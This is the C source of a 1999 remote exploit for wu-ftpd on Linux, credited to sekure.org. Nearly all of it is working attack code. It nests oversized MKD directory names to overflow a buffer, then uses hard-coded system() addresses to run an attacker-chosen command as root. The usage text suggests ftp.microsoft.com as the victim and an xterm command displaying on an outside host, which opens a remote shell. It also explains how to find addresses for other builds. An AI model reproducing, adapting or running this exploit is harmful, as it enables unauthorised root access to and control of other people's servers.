/*
 * SDI wu-ftpd exploit for Linux (Feb 20, 1999)
 *
 * http://www.sekure.org - Brazilian Information Security Team.
 *
 * Source by jamez  (jamez@sekure.org)
 *           c0nd0r (condor@sekure.org)
 *
 * This source will let you execute remote commands as root if you have
 * write access on the ftp server.
 *
 * Usage:
 *
 *    gcc SDI-wu.c -o SDI-wu
 *
 *    ./SDI-wu host user password dir command type [port] [align]
 *
 *    host:     the victim (ftp.microsoft.com)
 *    user:     ftp user with write access (anonymous)
 *    password: the password for the user (foo@bar.com)
 *    dir:      the directory you have access (/incoming)
 *    command:  the command ("/usr/X11R6/bin/xterm -display www.host.com:0")
 *    type:     system type (see below)
 *    port:     ftp port (21 default)
 *    align:    the alignment (default 3)
 *
 *
 * Limitations:
 *
 *    because I've used hard coded address's for system and the command,
 *    the  values  wont  be  the same in others compilations of wu-ftpd.
 *    so,  you will  need to  find   the  address   for   the   version
 *    you want to exploit.
 *
 *    because we are not using the stack to  put our code, the  exploit
 *    will work  as well against a non-executable stack patch.
 *
 *
 * RECOMENDATION = Please, run gdb through the wu.ftpd binary in order to
 * find out your "system address" (ie: print system) and  write it   down
 * so you can have more address to try - just overwrite the default addr
 * and choose type (3).
 *
 *
 * Thanks for the sekure SDI:
 * fcon, bishop, dumped, bahamas, slide, vader, yuckfoo.
 *
 * Also thanks for #uground (irc.brasnet.org) and
 * chaosmaker, c_orb(efnet)
 *
 */


#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdio.h>
#include <arpa/inet.h>

#define MAXLEN 255
#define BSIZE 1024



struct sockaddr_in sa;
struct hostent *he;


char c = 'A';

char host[255],
  user[255],
  pass[255],
  command[1024],
  buff[2040],
  tmp[3060],
  netbuf[2040],
  dir[255];

int sd,
  i,
  offset = 0,
  dirsize = 0,
  port=21,
  doit = 0,
  done = 0,
  todo = 0,
  align = 3,
  tipo = 0;

/* CUSTOM ADDRESS, CHANGE IT IN ORDER TO EXPLOIT ANOTHER BOX */
#define SYSADDR 0x40043194;
#define EGGADDR 0x805f1dc;

long systemaddr;
long shelladdr;


void usage(char * s) {
  printf(" \nSDI wu-ftpd remote exploit (http://www.sekure.org)\n\n");
  printf(" %s host user password dir command [port] [align]\n\n", s);
  printf(" host:         the victim (ftp.microsoft.com)\n");
  printf(" user:         ftp user with write access (anonymous)\n");
  printf(" password:     the password for the user (foo@bar.com)\n");
  printf(" dir:          the directory you have permission to write (/incoming)\n");
  printf(" command:      the command (\"/usr/X11R6/bin/xterm -display www.host.com:0\")\n");
  printf(" type:         see below\n");
  printf(" port:         ftp port (21 default)\n");
  printf(" align:        the alignment (3 default)\n");
  printf("\n type:\n 0 - slak3.4 ver 2.4(4)\n 1 - slak3.4 ver beta-15&18");
  printf("\n 2 - slak3.3 ver 2.4(2)");
  printf("\n 3 - custom (change the code)\n\n See Netect advisory - ");
  printf(" this is not suppose to be released soon! (Feb,1999)\n\n");
}




void get_dirsize() {
  strcpy ( tmp, "PWD"); strcat ( tmp, "\n");
  write ( sd, tmp, strlen(tmp));
  read ( sd, netbuf, sizeof(netbuf));

  for(i = 0; i < strlen(netbuf); i++)
    if(netbuf[i] == '\"') break;

  dirsize = 0;

  for(i++; i < strlen(netbuf); i++)
    if(netbuf[i] == '\"')
      break;
    else
      dirsize++;

  bzero ( &netbuf, sizeof(netbuf));


}

int main (int argc, char *argv[]) {


  if (argc < 7)  {
    usage(argv[0]);
    exit(0);
  }

  sprintf(host, "%s", argv[1]);
  sprintf(user, "%s", argv[2]);
  sprintf(pass, "%s", argv[3]);
  sprintf(dir, "%s", argv[4]);
  sprintf(command, "%s", argv[5]);

  tipo = atoi (argv[6]);
  printf ( "%d\n\n", tipo);

  if ( argc > 7) port = atoi(argv[7]);
  if ( argc > 8) align = atoi(argv[8]);


  if (tipo <= 0) {
  /* 2.4(4) libc5 slack 3.4 */
   systemaddr = 0x400441f0;
   shelladdr = 0x80604a0;
  } else if (tipo == 1) {
  /* beta 15 libc5 slack 3.4 */
   systemaddr = 0x400441f0;
   shelladdr = 0x8062510;
  } else if (tipo == 2) {
/* 2.4(4) libc5 slack 3.3 */
   systemaddr = 0x400441f0;
   shelladdr = 0x805f1e4;
  } else {
 /* CUSTOM ADDRESS */
   systemaddr = SYSADDR;
   shelladdr = EGGADDR;
  }

  sd = socket ( AF_INET, SOCK_STREAM, 0);

  sa.sin_family = AF_INET;
  sa.sin_port = htons(port);

  he = gethostbyname (host);
  if (!he) {
    if ( (sa.sin_addr.s_addr = inet_addr(host)) == INADDR_NONE) {
      printf ( "wrong ip address or unknown hostname\n"); exit(0);
    }
  }
  else {
    bcopy ( he->h_addr, (struct in_addr *) &sa.sin_addr, he->h_length);
  }

  if ( connect ( sd, (struct sockaddr *) &sa, sizeof(sa)) < 0) {
    printf ( "Cannot connect to remote host: Connection refused\n");
    exit(0);
  }

  read ( sd, netbuf, sizeof(netbuf));
  printf ( "%s\n", netbuf); bzero ( &netbuf, sizeof(netbuf));
  /* ok. we're connected. */
  strcpy ( tmp, "USER "); strcat (tmp, user); strcat ( tmp, "\n");
  write ( sd, tmp, strlen(tmp)); bzero ( &tmp, sizeof(tmp));
  read ( sd, netbuf, sizeof(netbuf));
  printf ( "%s\n", netbuf); bzero ( &netbuf, sizeof(netbuf));
  /* ok. send the pass. */
  strcpy ( tmp, "PASS "); strcat (tmp, pass); strcat ( tmp, "\n");
  write ( sd, tmp, strlen(tmp));  bzero ( &tmp, sizeof(tmp));
  read ( sd, netbuf, sizeof(netbuf));
  if ( netbuf[0] == '5') {
    printf ("Login incorrect!\n"); exit(0); }

  printf ( "%s\n", netbuf);
#ifdef DEBUG
  printf ( "Ok, we're on! Press any key to exploit it\n");
  gets(netbuf);
#endif
  bzero ( &netbuf, sizeof(netbuf));

 /* ok. let's get to the vulnerable dir */
  strcpy ( tmp, "CWD "); strcat (tmp, dir); strcat ( tmp, "\n");
  write ( sd, tmp, strlen(tmp)); bzero ( &tmp, sizeof(tmp));
  read ( sd, netbuf, sizeof(netbuf));
  printf ( "%s\n", netbuf); bzero ( &netbuf, sizeof(netbuf));


  get_dirsize(); /* gets home dir size */


  todo = BSIZE - dirsize - 60 - 4;


  /* ok, we're on. let's get things working here! */
  while(done < todo) {

    if((todo - done) > 255)
      doit = 255;
    else
      doit = todo - done;


    for (i = 0; i < doit; i++)
      buff[i] = c;
    buff[doit] = '\0';


    strcpy ( tmp, "MKD "); strcat ( tmp, buff); strcat ( tmp, "\n");
    write ( sd, tmp, strlen(tmp));
    read ( sd, netbuf, sizeof(netbuf));
    if ( netbuf[1] == '2') {
      printf ("error while creating the dir, let's try another name...\n\n");
      c++;
      continue;
    }
    else
      done += doit;

    bzero ( &tmp, sizeof(tmp));  bzero ( &netbuf, sizeof(netbuf));
    strcpy ( tmp, "CWD "); strcat ( tmp, buff); strcat ( tmp, "\n");
    write ( sd, tmp, strlen(tmp));
    read ( sd, netbuf, sizeof(netbuf));
    if ( netbuf[0] == '5') {
      printf ("error while exploiting the remote host: Cannot cd dir!\n\n");
    }
    bzero ( &tmp, sizeof(tmp));  bzero ( &netbuf, sizeof(netbuf));
  }



  /* prepare last one */

  memset(buff, 'X', MAXLEN);

  for(i = align; i < 100; i += 4) {
    buff[i  ] = systemaddr & 0x000000ff;
    buff[i+1] = (systemaddr & 0x0000ff00) >> 8;
    buff[i+2] = (systemaddr & 0x00ff0000) >> 16;
    buff[i+3] = (systemaddr & 0xff000000) >> 24;
  }

  buff[i++] = shelladdr & 0x000000ff;
  buff[i++] = (shelladdr & 0x0000ff00) >> 8;
  buff[i++] = (shelladdr & 0x00ff0000) >> 16;
  buff[i++] = (shelladdr & 0xff000000) >> 24;

  strcat(command, ";");
  memcpy(buff+140, command, strlen(command));


  buff[MAXLEN] = '\0';

  strcpy ( tmp, "MKD "); strcat ( tmp, buff); strcat ( tmp, "\n");
  write ( sd, tmp, strlen(tmp));
  read ( sd, netbuf, sizeof(netbuf));
  bzero ( &tmp, sizeof(tmp));  bzero ( &netbuf, sizeof(netbuf));

  /* ok. */

  printf ( "Exploiting %s\n", dir);
  printf ( "Using 0x%x(system) and 0x%x(command), alignment = %d, port = %d\n", systemaddr, shelladdr, align, port);
  printf("\nI guess you're a hax0r now :D.\n");

  close (sd);

}
